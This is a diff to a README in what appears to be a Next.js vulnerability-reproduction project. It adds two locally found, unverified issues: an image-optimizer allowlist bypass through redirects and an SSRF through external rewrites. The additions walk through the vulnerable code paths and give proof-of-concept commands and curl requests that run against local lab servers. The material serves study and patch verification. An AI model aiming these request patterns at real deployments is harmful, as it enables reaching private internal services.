@@ -11,6 +11,8 @@ The goal of this project is to make the root cause and practical impact of each 
 | `CVE-2025-29927` | [GHSA-f82v-jwr5-mffw](https://github.com/vercel/next.js/security/advisories/GHSA-f82v-jwr5-mffw) | authorization bypass when access control relies only on middleware | `15.2.2` | `15.2.3` |
 | `CVE-2026-27978` | [GHSA-mq59-m269-xvcx](https://github.com/vercel/next.js/security/advisories/GHSA-mq59-m269-xvcx) | `Origin: null` bypass of Server Actions CSRF checks | `16.1.6` | `16.1.7` |
 | `CVE-2026-29057` | [GHSA-ggv3-7p47-pfv8](https://github.com/advisories/GHSA-ggv3-7p47-pfv8) | HTTP request smuggling through rewrites to an external backend | `15.5.12` | `15.5.13` |
+| `NEXT-16.2.4-IMAGE-REDIRECT` | local source audit finding | image optimizer remote allowlist bypass through redirects | `16.2.4` | not verified |
+| `NEXT-16.2.4-IMAGE-LOCAL-REWRITE` | local source audit finding | image optimizer local URL can reach private upstream through external rewrites | `16.2.4` | not verified |
 
 ## Release Commits and Patch Commits
 
@@ -30,11 +32,15 @@ The hashes below are taken from upstream `vercel/next.js`.
 |- pocs/
 |  |- cve-2025-29927/
 |  |- cve-2026-27978/
-|  `- cve-2026-29057/
+|  |- cve-2026-29057/
+|  |- next-16.2.4-image-redirect-allowlist-bypass/
+|  `- next-16.2.4-image-local-rewrite-ssrf/
 `- scripts/
    |- run-cve-2025-29927.mjs
    |- run-cve-2026-27978.mjs
-   `- run-cve-2026-29057.mjs
+   |- run-cve-2026-29057.mjs
+   |- run-next-16.2.4-image-redirect-allowlist-bypass.mjs
+   `- run-next-16.2.4-image-local-rewrite-ssrf.mjs
 ```
 
 ## Prerequisites
@@ -57,6 +63,8 @@ Exposed ports:
 - `3004` -> `CVE-2026-27978` fixed
 - `3005` -> `CVE-2026-29057` vulnerable
 - `3006` -> `CVE-2026-29057` fixed
+- `3007` -> `NEXT-16.2.4-IMAGE-REDIRECT`
+- `3008` -> `NEXT-16.2.4-IMAGE-LOCAL-REWRITE`
 
 ## Reproduce 1: CVE-2025-29927
 
@@ -279,6 +287,51 @@ $ node scripts/run-cve-2026-29057.mjs http://localhost:3006
 PoC result: smuggled request was not observed. This usually means the target is patched.
 ```
 
+## Reproduce 4: NEXT-16.2.4-IMAGE-REDIRECT
+
+### Vulnerable Code Path
+
+The local `next.js-16.2.4` source validates `images.remotePatterns` only for the original `url` parameter in `ImageOptimizerCache.validateParams()`:
+
+```ts
+if (!hasRemoteMatch(domains, remotePatterns, hrefParsed)) {
+  return { errorMessage: '"url" parameter is not allowed' }
+}
+```
+
+The network fetch path then follows redirects recursively in `fetchExternalImage()`:
+
+```ts
+const redirect = new URL(locationHeader, href).href
+return fetchExternalImage(
+  redirect,
+  dangerouslyAllowLocalIP,
+  maximumResponseBody,
+  count - 1
+)
+```
+
+That recursive call keeps the private-IP check, but it does not receive or reapply `domains` / `remotePatterns`. A configured allowed image origin can therefore redirect the optimizer to a different public origin that would not pass the original image allowlist.
+
+The PoC uses localhost services and sets `dangerouslyAllowLocalIP: true` only so the allowlist behavior can be reproduced without external infrastructure. The configured image allowlist permits only `http://127.0.0.1:4100/allowed/**`; that server redirects to `http://127.0.0.1:4200/blocked/private.png`, and the second server records whether it was reached.
+
+### Run
+
+```bash
+docker compose up --build next-16-image-redirect-bypass
+```
+
+```bash
+node scripts/run-next-16.2.4-image-redirect-allowlist-bypass.mjs http://localhost:3007
+```
+
+Expected behavior:
+
+- the optimizer accepts the original allowed URL on port `4100`
+- the allowed upstream redirects to a URL on port `4200`, which is outside `images.remotePatterns`
+- on the vulnerable target, the port `4200` upstream records `GET /blocked/private.png`
+- on a patched target, the redirect target should be rejected before the second upstream is fetched
+
 ## Quick Manual Commands
 
 ### CVE-2025-29927
@@ -295,6 +348,75 @@ Use the provided script, because the Server Action field is generated dynamicall
 ### CVE-2026-29057
 
 Use the provided script, because the exploit relies on a raw TCP payload with a smuggled second request.
+
+### NEXT-16.2.4-IMAGE-REDIRECT
+
+```bash
+curl "http://localhost:3007/_next/image?url=http%3A%2F%2F127.0.0.1%3A4100%2Fallowed%2Fredirect.png&w=64&q=75"
+curl http://localhost:3007/api/state
+```
+
+## Reproduce 5: NEXT-16.2.4-IMAGE-LOCAL-REWRITE
+
+### Vulnerable Code Path
+
+For a local image URL, `ImageOptimizerCache.validateParams()` validates only the local pathname against `images.localPatterns`:
+
+```ts
+if (!hasLocalMatch(localPatterns, url)) {
+  return { errorMessage: '"url" parameter is not allowed' }
+}
+```
+
+The internal fetch path then re-enters the Next.js request handler:
+
+```ts
+await handleRequest(mocked.req, mocked.res, nodeUrl.parse(href, true))
+```
+
+If the matched local route is configured as an external rewrite, the request can be proxied to that external destination. This path does not call `fetchExternalImage()`, so the private-IP protection used for absolute image URLs is not applied to the rewritten destination.
+
+The PoC config allows only local image URLs under `/allowed/**`, then rewrites that path to `http://127.0.0.1:4300/private/:path*`:
+
+```js
+const nextConfig = {
+  images: {
+    localPatterns: [{ pathname: '/allowed/**' }],
+  },
+  async rewrites() {
+    return [
+      {
+        source: '/allowed/:path*',
+        destination: 'http://127.0.0.1:4300/private/:path*',
+      },
+    ]
+  },
+}
+```
+
+### Run
+
+```bash
+docker compose up --build next-16-image-local-rewrite-ssrf
+```
+
+```bash
+node scripts/run-next-16.2.4-image-local-rewrite-ssrf.mjs http://localhost:3008
+```
+
+Expected behavior:
+
+- the optimizer accepts `/allowed/secret.png` because it matches `images.localPatterns`
+- Next.js applies the external rewrite to `http://127.0.0.1:4300/private/secret.png`
+- on the vulnerable target, the private upstream records `GET /private/secret.png`
+- on a patched target, the image optimizer should reject external/private rewrite destinations before proxying them
+
+### NEXT-16.2.4-IMAGE-LOCAL-REWRITE
+
+```bash
+curl "http://localhost:3008/_next/image?url=%2Fallowed%2Fsecret.png&w=64&q=75"
+curl http://localhost:3008/api/state
+```
 
 ## Sources
 
